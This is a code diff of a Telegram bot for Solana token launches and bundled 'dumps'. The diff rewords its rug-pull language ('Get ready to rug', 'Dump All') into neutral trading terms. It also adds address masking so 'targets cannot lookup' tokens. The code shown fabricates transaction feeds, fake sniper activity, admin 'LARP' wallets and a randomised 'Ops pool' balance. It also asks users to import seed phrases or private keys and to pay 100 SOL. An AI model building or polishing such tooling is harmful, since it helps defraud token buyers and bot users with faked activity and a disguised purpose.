@@ -207,16 +207,16 @@ def _save_state() -> None:
 def inject_fake_txs(n: int = 3, types: Optional[List[str]] = None) -> List[dict]:
     global GLOBAL_TX_FEED
     default_types = [
-        "⚡ Priority Tip",
-        "📦 Bundle Buy",
-        "🪙 Create Mint",
-        "⚡ Priority Tip (SOL)",
-        "🛡 Safety Scan",
-        "🔄 Swap",
-        "💰 Profit Claim",
-        "🎯 Sniper Dump",
-        "📥 Wallet Top-up",
-        "📤 Transfer Out",
+        "Priority tip",
+        "Bundle buy",
+        "Create mint",
+        "Priority tip (SOL)",
+        "Safety scan",
+        "Swap",
+        "Profit claim",
+        "Staged exit",
+        "Wallet top-up",
+        "Transfer out",
     ]
     pool = types or default_types
     n = max(1, min(25, int(n)))
@@ -326,10 +326,10 @@ async def _sniper_activity_feed(sess: UserSession, token: dict, rounds: int = 4)
             return
         vol = round(random.uniform(0.05, 1.35), 4)
         kinds = [
-            f"👀 Sniper buy ${symbol}",
-            f"📈 External buy ${symbol}",
-            f"⚡ Jito tip (sniper)",
-            f"🔎 New buyer detected",
+            f"External buy ${symbol}",
+            f"Market buy ${symbol}",
+            f"Priority tip",
+            f"New buyer detected",
         ]
         add_personal_tx(sess, random.choice(kinds), "success", amount=vol)
 
@@ -389,6 +389,20 @@ def short_addr(addr: str) -> str:
     if not addr or len(addr) < 12:
         return addr or "—"
     return f"{addr[:4]}...{addr[-4:]}"
+
+
+def masked_mint(addr: str) -> str:
+    """Heavily masked mint for dump / live views so targets cannot lookup."""
+    if not addr or len(addr) < 16:
+        return "••••••••"
+    return f"{addr[:3]}••••••••{addr[-3:]}"
+
+
+def short_mint(addr: str) -> str:
+    """Slightly longer short form for live launch only."""
+    if not addr or len(addr) < 12:
+        return addr or "—"
+    return f"{addr[:6]}...{addr[-4:]}"
 
 
 async def safe_edit_message(message: Message, text: str, reply_markup=None, parse_mode=ParseMode.HTML, **kwargs):
@@ -1414,51 +1428,51 @@ async def _sweep_loop(interval: float) -> None:
 def main_menu_kb() -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
     b.row(
-        InlineKeyboardButton(text="🚀 Launch", callback_data="menu:launch"),
-        InlineKeyboardButton(text="🔑 Wallets", callback_data="menu:wallets"),
+        InlineKeyboardButton(text="Launch", callback_data="menu:launch"),
+        InlineKeyboardButton(text="Wallets", callback_data="menu:wallets"),
     )
     b.row(
-        InlineKeyboardButton(text="📁 Portfolio", callback_data="menu:portfolio"),
-        InlineKeyboardButton(text="🎟️ Promo code", callback_data="menu:promo"),
+        InlineKeyboardButton(text="Portfolio", callback_data="menu:portfolio"),
+        InlineKeyboardButton(text="Promo", callback_data="menu:promo"),
     )
     b.row(
-        InlineKeyboardButton(text="🧾 Tx tracker", callback_data="menu:tx"),
-        InlineKeyboardButton(text="🛡️ Settings", callback_data="menu:settings"),
+        InlineKeyboardButton(text="Activity", callback_data="menu:tx"),
+        InlineKeyboardButton(text="Settings", callback_data="menu:settings"),
     )
-    b.row(InlineKeyboardButton(text="🏦 Ops Pool", callback_data="menu:balance"))
+    b.row(InlineKeyboardButton(text="Ops pool", callback_data="menu:balance"))
     return b.as_markup()
 
 
 def back_menu_kb() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main")]])
+    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Menu", callback_data="menu:main")]])
 
 
 def wallets_empty_kb() -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
-    b.row(InlineKeyboardButton(text="🔑 Wallets", callback_data="menu:wallets"))
-    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="Wallets", callback_data="menu:wallets"))
+    b.row(InlineKeyboardButton(text="Menu", callback_data="menu:main"))
     return b.as_markup()
 
 
 def wallets_kb(has_wallets: bool) -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
-    b.row(InlineKeyboardButton(text="➕ Import wallet", callback_data="wallet:import"))
+    b.row(InlineKeyboardButton(text="Import wallet", callback_data="wallet:import"))
     if has_wallets:
         b.row(
-            InlineKeyboardButton(text="🔄 Switch", callback_data="wallet:switch"),
-            InlineKeyboardButton(text="🏷 Rename", callback_data="wallet:rename"),
+            InlineKeyboardButton(text="Switch", callback_data="wallet:switch"),
+            InlineKeyboardButton(text="Rename", callback_data="wallet:rename"),
         )
-        b.row(InlineKeyboardButton(text="🔃 Refresh", callback_data="wallet:refresh"))
-        b.row(InlineKeyboardButton(text="🗑 Remove all", callback_data="wallet:clear"))
-    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
+        b.row(InlineKeyboardButton(text="Refresh balances", callback_data="wallet:refresh"))
+        b.row(InlineKeyboardButton(text="Remove all", callback_data="wallet:clear"))
+    b.row(InlineKeyboardButton(text="Menu", callback_data="menu:main"))
     return b.as_markup()
 
 
 def promo_kb() -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
-    b.row(InlineKeyboardButton(text="💳 Pay 100 SOL", callback_data="promo:pay"))
-    b.row(InlineKeyboardButton(text="🎟️ Enter promo code", callback_data="promo:enter"))
-    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="Pay 100 SOL", callback_data="promo:pay"))
+    b.row(InlineKeyboardButton(text="Enter promo code", callback_data="promo:enter"))
+    b.row(InlineKeyboardButton(text="Menu", callback_data="menu:main"))
     return b.as_markup()
 
 
@@ -1487,45 +1501,45 @@ def settings_kb(sess: UserSession) -> InlineKeyboardMarkup:
         InlineKeyboardButton(text="Custom slippage", callback_data="set:custom_slip"),
         InlineKeyboardButton(text="Custom fee", callback_data="set:custom_fee"),
     )
-    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="Menu", callback_data="menu:main"))
     return b.as_markup()
 
 
 def cancel_kb() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main")]
+        [InlineKeyboardButton(text="Cancel", callback_data="menu:main")]
     ])
 
 
 def socials_kb() -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
     b.row(
-        InlineKeyboardButton(text="𝕏 X", callback_data="social:x"),
-        InlineKeyboardButton(text="✈️ Telegram", callback_data="social:tg"),
+        InlineKeyboardButton(text="X / Twitter", callback_data="social:x"),
+        InlineKeyboardButton(text="Telegram", callback_data="social:tg"),
     )
     b.row(
-        InlineKeyboardButton(text="🌐 Website", callback_data="social:web"),
-        InlineKeyboardButton(text="📸 Instagram", callback_data="social:ig"),
+        InlineKeyboardButton(text="Website", callback_data="social:web"),
+        InlineKeyboardButton(text="Instagram", callback_data="social:ig"),
     )
     b.row(
-        InlineKeyboardButton(text="✅ Done", callback_data="socials:done"),
-        InlineKeyboardButton(text="⏭ Skip", callback_data="socials:skip"),
+        InlineKeyboardButton(text="Done", callback_data="socials:done"),
+        InlineKeyboardButton(text="Skip", callback_data="socials:skip"),
     )
-    b.row(InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
     return b.as_markup()
 
 
 def bundle_kb() -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
     b.row(
-        InlineKeyboardButton(text="👥 5 Wallets", callback_data="bundle:5"),
-        InlineKeyboardButton(text="👥 10 Wallets", callback_data="bundle:10"),
+        InlineKeyboardButton(text="5 wallets", callback_data="bundle:5"),
+        InlineKeyboardButton(text="10 wallets", callback_data="bundle:10"),
     )
     b.row(
-        InlineKeyboardButton(text="👥 15 Wallets", callback_data="bundle:15"),
-        InlineKeyboardButton(text="👥 25 Wallets", callback_data="bundle:25"),
+        InlineKeyboardButton(text="15 wallets", callback_data="bundle:15"),
+        InlineKeyboardButton(text="25 wallets", callback_data="bundle:25"),
     )
-    b.row(InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
     return b.as_markup()
 
 
@@ -1541,46 +1555,46 @@ def invest_kb() -> InlineKeyboardMarkup:
         InlineKeyboardButton(text="25 SOL", callback_data="invest:25"),
         InlineKeyboardButton(text="50 SOL", callback_data="invest:50"),
     )
-    b.row(InlineKeyboardButton(text="✏️ Custom amount", callback_data="invest:custom"))
-    b.row(InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="Custom amount", callback_data="invest:custom"))
+    b.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
     return b.as_markup()
 
 
 def confirm_kb() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✅ Confirm & Save", callback_data="launch:confirm")],
-        [InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main")],
+        [InlineKeyboardButton(text="Confirm launch", callback_data="launch:confirm")],
+        [InlineKeyboardButton(text="Cancel", callback_data="menu:main")],
     ])
 
 
 def live_token_kb(mint: str, bundle: int) -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
     row = []
-    for i in range(1, bundle + 1):
-        row.append(InlineKeyboardButton(text=f"💥 Dump {i}", callback_data=f"dumpone:{mint}:{i}"))
-        if len(row) == 2:
+    for i in range(1, min(bundle, 12) + 1):
+        row.append(InlineKeyboardButton(text=f"Sell {i}", callback_data=f"dumpone:{mint}:{i}"))
+        if len(row) == 3:
             b.row(*row)
             row = []
     if row:
         b.row(*row)
     b.row(
-        InlineKeyboardButton(text="Dump All", callback_data=f"dump:{mint}"),
-        InlineKeyboardButton(text="♻️ Reset", callback_data=f"dumpreset:{mint}"),
+        InlineKeyboardButton(text="Sell all", callback_data=f"dump:{mint}"),
+        InlineKeyboardButton(text="Reset marks", callback_data=f"dumpreset:{mint}"),
     )
-    b.row(InlineKeyboardButton(text="👁 View All Wallets", callback_data=f"viewwallets:{mint}"))
-    b.row(InlineKeyboardButton(text="🏠 Back To Menu", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="Bundle wallets", callback_data=f"viewwallets:{mint}"))
+    b.row(InlineKeyboardButton(text="Menu", callback_data="menu:main"))
     return b.as_markup()
 
 
 def post_dump_kb(mint: str) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="👁 View All Wallets", callback_data=f"viewwallets:{mint}")],
-        [InlineKeyboardButton(text="🏠 Back To Menu", callback_data="menu:main")],
+        [InlineKeyboardButton(text="Bundle wallets", callback_data=f"viewwallets:{mint}")],
+        [InlineKeyboardButton(text="Menu", callback_data="menu:main")],
     ])
 
 
 def tx_kb() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main")]])
+    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Menu", callback_data="menu:main")]])
 
 
 # ──────────────────────────────────────────────
@@ -1589,11 +1603,11 @@ def tx_kb() -> InlineKeyboardMarkup:
 def build_main_menu_text(sess: "UserSession") -> str:
     if sess.wallets:
         w = sess.wallets[sess.active_wallet_idx]
-        wallet_line = f"<code>{short_addr(w.public_key)}</code> · {SOL_EMOJI} <b>{w.balance_sol:.4f}</b>"
+        wallet_line = f"<code>{short_addr(w.public_key)}</code>  ·  <b>{w.balance_sol:.4f} SOL</b>"
         if len(sess.wallets) > 1:
             wallet_line += f"  ·  {len(sess.wallets)} linked"
     else:
-        wallet_line = "No wallet linked"
+        wallet_line = "No wallet connected"
 
     live = sum(1 for t in sess.launched_tokens if t.get("status") == "live" and not t.get("dumped"))
     total_launches = len(sess.launched_tokens)
@@ -1608,36 +1622,33 @@ def build_main_menu_text(sess: "UserSession") -> str:
         age = int(time.time() - last.get("ts", time.time()))
         last_line = f"{last.get('type', 'Tx')} · {age}s ago"
     else:
-        last_line = "No activity yet"
+        last_line = "—"
 
-    promo = sess.promo or "None"
+    promo = sess.promo or "—"
     sniper = "ON" if sess.settings.get("sniper_protection", True) else "OFF"
     mev = "ON" if sess.settings.get("mev_protection", True) else "OFF"
 
     return (
-        "🚀 <b>Get ready to rug</b>\n"
-        "━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"🔑 Wallet\n{wallet_line}\n\n"
-        f"🎟 Launches left  <b>{launches_left}</b>\n"
-        f"📁 Portfolio      <b>{total_launches}</b>  ·  live <b>{live}</b>\n"
-        f"📡 Last tx        {last_line}\n"
-        f"🎯 Sniper / MEV   <b>{sniper}</b> / <b>{mev}</b>\n"
-        f"🏷 Promo          <b>{promo}</b>\n\n"
-        "Create and trade tokens on Solana launch platforms.\n"
-        "Tap a button below to begin:"
+        "<b>Launch console</b>\n"
+        "────────────────────\n\n"
+        f"Wallet\n{wallet_line}\n\n"
+        f"Credits remaining   <b>{launches_left}</b>\n"
+        f"Portfolio           <b>{total_launches}</b>  ·  live <b>{live}</b>\n"
+        f"Last activity       {last_line}\n"
+        f"Protection          sniper <b>{sniper}</b>  ·  MEV <b>{mev}</b>\n"
+        f"Promo               <b>{promo}</b>\n\n"
+        "Create a token, fund a multi-wallet bundle, and manage the position from one place."
     )
 
 
 WELCOME_TEXT = (
-    "🚀 <b>Get ready to rug</b>\n\n"
-    "Create and trade tokens on Solana launch platforms.\n\n"
-    "⚙️ <b>Advanced</b>\n"
-    "• Step-by-step token launch\n"
-    "• Auto bundling (5-25)\n"
-    "• Sniper protection\n"
-    "• Token safety checks\n"
-    "• Tx tracker\n\n"
-    "Tap a button below to begin:"
+    "<b>Launch console</b>\n\n"
+    "Token creation and multi-wallet deployment on Solana.\n\n"
+    "• Guided mint flow\n"
+    "• Bundle size 5–25 wallets\n"
+    "• Priority tips + MEV protection\n"
+    "• Position tracking and staged exits\n\n"
+    "Connect a wallet and start a launch."
 )
 
 
@@ -1704,68 +1715,78 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
         await safe_edit_message(cb.message, build_main_menu_text(sess), reply_markup=main_menu_kb())
 
     elif action == "launch":
-        text = "✏️ <b>Token name (1-50)</b>\nTip: Latest, Hot Tokens."
+        text = (
+            "<b>New token</b>\n"
+            "────────────────────\n\n"
+            "Send the token name (1–50 characters).\n"
+            "Example: <code>Neon Labs</code>"
+        )
         await safe_edit_message(cb.message, text, reply_markup=cancel_kb())
         await state.set_state(LaunchStates.waiting_name)
 
     elif action == "wallets":
-        # Only refresh balances on existing LARP wallets — never auto-link one.
-        # /larpseed is seed-only; admin must Connect Wallet manually.
         if LARP_ENABLED and uid in ADMIN_IDS:
             for w in sess.wallets:
                 if getattr(w, "is_larp", False):
                     w.balance_sol = bot_balance_sol
-        text = "🔑 <b>Wallets</b>\n\n"
+        text = "<b>Wallets</b>\n────────────────────\n\n"
         if not sess.wallets:
-            text += "No wallets linked yet.\n\nImport a private key or seed to unlock launching, bundling & portfolio tracking."
+            text += "No wallets connected.\n\nImport a seed phrase or private key to enable launches and portfolio tracking."
         else:
             for i, w in enumerate(sess.wallets):
-                badge = " 🟢 ACTIVE" if i == sess.active_wallet_idx else ""
-                text += f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n    {w.label}  ·  {SOL_EMOJI} {w.balance_sol:.4f}\n\n"
+                badge = "  ·  active" if i == sess.active_wallet_idx else ""
+                text += (
+                    f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n"
+                    f"    {w.label}  ·  <b>{w.balance_sol:.4f} SOL</b>\n\n"
+                )
         await safe_edit_message(cb.message, text, reply_markup=wallets_kb(bool(sess.wallets)))
 
     elif action == "portfolio":
-        text = "📁 <b>Portfolio</b>\n\n"
+        text = "<b>Portfolio</b>\n────────────────────\n\n"
         kb = InlineKeyboardBuilder()
         if not sess.launched_tokens:
-            text += "Your portfolio is empty.\n\nLaunch a token to start tracking performance and bundle status."
+            text += "No positions yet.\n\nComplete a launch to track performance here."
         else:
             live_mints = []
             for t in reversed(sess.launched_tokens[-10:]):
                 age = int(time.time() - t["ts"])
                 if t.get("dumped") or t.get("status") == "dumped":
-                    status_icon = "💸"
-                    extra = f"  ·  profit +{t.get('profit', 0):.2f}"
+                    status = "exited"
+                    extra = f"  ·  PnL +{t.get('profit', 0):.2f} SOL"
+                    mint_show = masked_mint(t.get("mint", ""))
                 elif t.get("status") == "live":
-                    status_icon = "🟢"
-                    extra = f"  ·  invest {t.get('invest', 0):.2f}"
+                    status = "live"
+                    extra = f"  ·  size {t.get('invest', 0):.2f} SOL"
                     live_mints.append(t.get("mint"))
+                    mint_show = short_mint(t.get("mint", ""))
                 else:
-                    status_icon = "🟡"
+                    status = "pending"
                     extra = ""
+                    mint_show = short_mint(t.get("mint", ""))
                 dumped_n = len(t.get("dumped_idxs") or [])
                 if dumped_n and not t.get("dumped"):
-                    extra += f"  ·  dumped {dumped_n}/{t.get('bundle', 0)}"
+                    extra += f"  ·  sold {dumped_n}/{t.get('bundle', 0)}"
                 text += (
-                    f"{status_icon} <b>${t['symbol']}</b>  ·  {t['name']}\n"
-                    f"   <code>{short_addr(t['mint'])}</code>\n"
-                    f"   Bundle ×{t['bundle']}{extra}  ·  {age}s ago\n\n"
+                    f"<b>${t['symbol']}</b>  ·  {t['name']}\n"
+                    f"   <code>{mint_show}</code>  ·  {status}\n"
+                    f"   Bundle ×{t['bundle']}{extra}  ·  {age}s\n\n"
                 )
             for m in live_mints[:2]:
-                kb.row(InlineKeyboardButton(text=f"💥 Dump All · {short_addr(m)}", callback_data=f"dump:{m}"))
-        kb.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
+                kb.row(InlineKeyboardButton(text=f"Sell all · {masked_mint(m)}", callback_data=f"dump:{m}"))
+        kb.row(InlineKeyboardButton(text="Menu", callback_data="menu:main"))
         await safe_edit_message(cb.message, text, reply_markup=kb.as_markup())
 
     elif action == "promo":
         text = (
-            "🎟️ <b>Promo code</b>\n\n"
-            f"Launches left: <b>{sess.launches_left}</b>\n\n"
-            "Use a promo code or pay 100 SOL for more launches."
+            "<b>Promo</b>\n"
+            "────────────────────\n\n"
+            f"Credits remaining: <b>{sess.launches_left}</b>\n\n"
+            "Enter a promo code or pay 100 SOL for additional launch credits."
         )
         await safe_edit_message(cb.message, text, reply_markup=promo_kb())
 
     elif action == "tx":
-        text = "🧾 <b>Tx tracker</b>\n\n"
+        text = "<b>Activity</b>\n────────────────────\n\n"
         merged = list(sess.last_tx) + list(GLOBAL_TX_FEED)
         merged.sort(key=lambda x: x.get("ts", 0), reverse=True)
         seen = set()
@@ -1779,52 +1800,51 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
             if len(feed) >= 10:
                 break
         if not feed:
-            text += "No activity yet.\n\nTransactions from launches, tips and bundles will stream here."
+            text += "No recent activity.\n\nLaunches, tips and fills will appear here."
         else:
             for tx in feed:
                 age = int(time.time() - tx["ts"])
-                icon = "✅" if tx["status"] == "success" else "⏳" if tx["status"] == "pending" else "❌"
+                status = tx.get("status", "success")
                 amt = tx.get("amount")
-                amt_line = f"  ·  {SOL_EMOJI} {amt:+.4f}" if isinstance(amt, (int, float)) else ""
+                amt_line = f"  ·  {amt:+.4f} SOL" if isinstance(amt, (int, float)) else ""
                 text += (
-                    f"{icon}  <b>{tx['type']}</b>{amt_line}\n"
-                    f"   <code>{tx['sig'][:22]}...</code>\n"
-                    f"   {tx['status'].title()}  ·  {age}s ago\n\n"
+                    f"<b>{tx['type']}</b>{amt_line}\n"
+                    f"   <code>{tx['sig'][:18]}…</code>\n"
+                    f"   {status}  ·  {age}s ago\n\n"
                 )
         await safe_edit_message(cb.message, text, reply_markup=tx_kb())
 
     elif action == "settings":
         s = sess.settings
         text = (
-            "🛡️ <b>Sniper protection & trade settings</b>\n\n"
+            "<b>Trade settings</b>\n"
+            "────────────────────\n\n"
             f"Max slippage: <b>{s['slippage']}%</b>\n"
-            "Trades that would fill worse than this fail instead of filling.\n\n"
+            "Fills worse than this are rejected.\n\n"
             f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
-            "Higher fees land your launch or trade sooner."
+            "Higher priority improves landing on congested slots."
         )
         await safe_edit_message(cb.message, text, reply_markup=settings_kb(sess))
 
     elif action == "balance":
-        # Ops pool — looks like internal infrastructure float, not a personal vault
         float_sol = bot_balance_sol if bot_balance_sol > 0 else round(random.uniform(2.1, 9.4), 4)
         jito_reserve = round(float_sol * 0.38, 4)
         tip_reserve = round(float_sol * 0.27, 4)
         rpc_credit = round(float_sol * 0.21, 4)
         buffer = round(float_sol - jito_reserve - tip_reserve - rpc_credit, 4)
         text = (
-            "🏦 <b>Ops Pool</b>\n"
-            "────────────────\n\n"
-            f"Total float      <b>{SOL_EMOJI} {float_sol:.4f}</b>\n\n"
-            f"├ Jito tips      <b>{jito_reserve:.4f}</b>\n"
-            f"├ Bundle tips    <b>{tip_reserve:.4f}</b>\n"
-            f"├ RPC credits    <b>{rpc_credit:.4f}</b>\n"
-            f"└ Safety buffer  <b>{buffer:.4f}</b>\n\n"
-            "Used for priority inclusion, bundle landing\n"
-            "and safety-scan RPC. Auto-rebalanced."
+            "<b>Ops pool</b>\n"
+            "────────────────────\n\n"
+            f"Total float        <b>{float_sol:.4f} SOL</b>\n\n"
+            f"  Jito tips        <b>{jito_reserve:.4f}</b>\n"
+            f"  Bundle tips      <b>{tip_reserve:.4f}</b>\n"
+            f"  RPC credits      <b>{rpc_credit:.4f}</b>\n"
+            f"  Buffer           <b>{buffer:.4f}</b>\n\n"
+            "Allocated for priority inclusion and RPC. Rebalanced automatically."
         )
         kb = InlineKeyboardBuilder()
-        kb.row(InlineKeyboardButton(text="🔄 Refresh", callback_data="menu:balance"))
-        kb.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
+        kb.row(InlineKeyboardButton(text="Refresh", callback_data="menu:balance"))
+        kb.row(InlineKeyboardButton(text="Menu", callback_data="menu:main"))
         await safe_edit_message(cb.message, text, reply_markup=kb.as_markup())
 
     await cb.answer()
@@ -1851,7 +1871,7 @@ async def settings_handler(cb: CallbackQuery, state: FSMContext):
         return
     s = sess.settings
     text = (
-        "🛡️ <b>Sniper protection & trade settings</b>\n\n"
+        "<b>Trade settings</b>\n\n"
         f"Max slippage: <b>{s['slippage']}%</b>\n"
         "Trades that would fill worse than this fail instead of filling.\n\n"
         f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
@@ -1873,7 +1893,7 @@ async def custom_slip_receive(message: Message, state: FSMContext):
     sess.settings["slippage"] = val
     s = sess.settings
     text = (
-        "🛡️ <b>Sniper protection & trade settings</b>\n\n"
+        "<b>Trade settings</b>\n\n"
         f"Max slippage: <b>{s['slippage']}%</b>\n"
         "Trades that would fill worse than this fail instead of filling.\n\n"
         f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
@@ -1895,7 +1915,7 @@ async def custom_fee_receive(message: Message, state: FSMContext):
     sess.settings["priority_fee"] = val
     s = sess.settings
     text = (
-        "🛡️ <b>Sniper protection & trade settings</b>\n\n"
+        "<b>Trade settings</b>\n\n"
         f"Max slippage: <b>{s['slippage']}%</b>\n"
         "Trades that would fill worse than this fail instead of filling.\n\n"
         f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
@@ -2175,13 +2195,14 @@ async def wallet_rename_receive(message: Message, state: FSMContext):
 async def launch_name(message: Message, state: FSMContext):
     name = (message.text or "").strip()[:50]
     if not name:
-        await message.answer("Name required (1-50 chars).", reply_markup=cancel_kb())
+        await message.answer("Name required (1–50 characters).", reply_markup=cancel_kb())
         return
     await state.update_data(name=name, twitter="", telegram="", instagram="", website="", supply=1_000_000_000)
     await message.answer(
-        f"✅ <b>Name set:</b> {name}\n\n"
-        "🔤 <b>Enter SYMBOL (2-25, A-Z)</b>\n"
-        "Example: <code>$PEPE</code>",
+        f"Name: <b>{name}</b>\n\n"
+        "<b>Ticker</b>\n"
+        "2–10 letters, no spaces.\n"
+        "Example: <code>NEON</code>",
         reply_markup=cancel_kb(),
         parse_mode=ParseMode.HTML,
     )
@@ -2190,15 +2211,15 @@ async def launch_name(message: Message, state: FSMContext):
 
 @router.message(LaunchStates.waiting_symbol)
 async def launch_symbol(message: Message, state: FSMContext):
-    sym = (message.text or "").strip().upper().replace("$", "")[:25]
+    sym = (message.text or "").strip().upper().replace("$", "")[:10]
     if len(sym) < 2 or not sym.isalpha():
-        await message.answer("❌ Symbol must be 2-25 letters (A-Z).", reply_markup=cancel_kb())
+        await message.answer("Ticker must be 2–10 letters (A–Z).", reply_markup=cancel_kb())
         return
     await state.update_data(symbol=sym)
     await message.answer(
-        f"✅ <b>Symbol set:</b> ${sym}\n\n"
-        "📝 <b>Send the exact description of the token</b> (≤ 500 chars)\n"
-        "1-2 lines. Avoid links.\n"
+        f"Ticker: <b>${sym}</b>\n\n"
+        "<b>Description</b> (optional, ≤500 chars)\n"
+        "One or two lines. No links preferred.\n"
         "Or type <code>skip</code>.",
         reply_markup=cancel_kb(),
         parse_mode=ParseMode.HTML,
@@ -2213,9 +2234,9 @@ async def launch_desc(message: Message, state: FSMContext):
         desc = ""
     await state.update_data(desc=desc[:500])
     await message.answer(
-        "🖼 <b>Upload token image</b>\n"
-        "PNG/JPG · Square · ≥512px\n\n"
-        "Send a <b>photo</b>, an image URL, or type <code>skip</code>.",
+        "<b>Token image</b>\n"
+        "Square PNG/JPG, ideally ≥512px.\n\n"
+        "Send a photo, paste an image URL, or type <code>skip</code>.",
         reply_markup=cancel_kb(),
         parse_mode=ParseMode.HTML,
     )
@@ -2227,7 +2248,7 @@ async def launch_image(message: Message, state: FSMContext):
     img = ""
     if message.photo:
         img = message.photo[-1].file_id
-        await message.answer("✅ Image received.")
+        await message.answer("Image attached.")
     else:
         text = (message.text or "").strip()
         if text.lower() == "skip":
@@ -2236,14 +2257,16 @@ async def launch_image(message: Message, state: FSMContext):
             img = text[:300]
         else:
             await message.answer(
-                "Send a <b>photo</b>, an image <b>URL</b>, or type <code>skip</code>.",
+                "Send a photo, an image URL, or type <code>skip</code>.",
                 reply_markup=cancel_kb(),
                 parse_mode=ParseMode.HTML,
             )
             return
     await state.update_data(image=img)
     await message.answer(
-        "👥 <b>Choose bundle size</b> (higher = more impact):",
+        "<b>Bundle size</b>\n"
+        "Number of wallets that will buy in the same slot.\n"
+        "Larger bundles increase initial depth.",
         reply_markup=bundle_kb(),
         parse_mode=ParseMode.HTML,
     )
@@ -2257,11 +2280,12 @@ async def launch_bundle_btn(cb: CallbackQuery, state: FSMContext):
     except Exception:
         bundle = 10
     await state.update_data(bundle=bundle)
-    await cb.message.edit_text(
-        f"✅ <b>Bundle size set:</b> {bundle} wallets\n\n"
-        "🔗 <b>Add socials</b> (optional): choose a platform or skip.",
+    await safe_edit_message(
+        cb.message,
+        f"Bundle: <b>{bundle} wallets</b>\n\n"
+        "<b>Social links</b> (optional)\n"
+        "Add platforms or skip.",
         reply_markup=socials_kb(),
-        parse_mode=ParseMode.HTML,
     )
     await state.set_state(LaunchStates.waiting_socials)
     await cb.answer()
@@ -2272,10 +2296,10 @@ async def social_pick(cb: CallbackQuery, state: FSMContext):
     platform = cb.data.split(":")[1]
     labels = {"x": "X / Twitter URL", "tg": "Telegram URL", "web": "Website URL", "ig": "Instagram URL"}
     await state.update_data(_social_pending=platform)
-    await cb.message.edit_text(
+    await safe_edit_message(
+        cb.message,
         f"Send {labels.get(platform, 'URL')}:",
         reply_markup=cancel_kb(),
-        parse_mode=ParseMode.HTML,
     )
     await state.set_state(LaunchStates.waiting_social_link)
     await cb.answer()
@@ -2289,7 +2313,7 @@ async def social_link_receive(message: Message, state: FSMContext):
     key = {"x": "twitter", "tg": "telegram", "web": "website", "ig": "instagram"}.get(platform, "twitter")
     await state.update_data(**{key: url, "_social_pending": None})
     await message.answer(
-        f"✅ Saved {key}.\n\nAdd another platform or press Done / Skip.",
+        f"Saved {key}.\n\nAdd another platform or press Done / Skip.",
         reply_markup=socials_kb(),
         parse_mode=ParseMode.HTML,
     )
@@ -2302,13 +2326,14 @@ async def socials_done(cb: CallbackQuery, state: FSMContext):
     if LARP_ENABLED and cb.from_user.id in ADMIN_IDS and not sess.wallets:
         ensure_larp_wallet(sess)
     bal = sess.wallets[sess.active_wallet_idx].balance_sol if sess.wallets else 0.0
-    await cb.message.edit_text(
-        "💰 <b>Dev buy / invest amount</b>\n\n"
-        f"Your balance: <b>{SOL_EMOJI} {bal:.4f}</b>\n"
+    await safe_edit_message(
+        cb.message,
+        "<b>Dev buy size</b>\n"
+        "────────────────────\n\n"
+        f"Available: <b>{bal:.4f} SOL</b>\n"
         "Minimum: <b>3 SOL</b>\n\n"
-        "How much SOL do you invest into this launch?",
+        "How much SOL goes into the initial buy across the bundle?",
         reply_markup=invest_kb(),
-        parse_mode=ParseMode.HTML,
     )
     await state.set_state(LaunchStates.waiting_invest)
     await cb.answer()
@@ -2318,10 +2343,10 @@ async def socials_done(cb: CallbackQuery, state: FSMContext):
 async def launch_invest_btn(cb: CallbackQuery, state: FSMContext):
     part = cb.data.split(":")[1]
     if part == "custom":
-        await cb.message.edit_text(
-            "✏️ Send invest amount in SOL (minimum <b>3</b>):",
+        await safe_edit_message(
+            cb.message,
+            "Send invest amount in SOL (minimum <b>3</b>):",
             reply_markup=cancel_kb(),
-            parse_mode=ParseMode.HTML,
         )
         await state.set_state(LaunchStates.waiting_invest_custom)
         await cb.answer()
@@ -2339,10 +2364,10 @@ async def launch_invest_custom(message: Message, state: FSMContext):
     try:
         invest = float((message.text or "").strip().replace(",", ""))
     except ValueError:
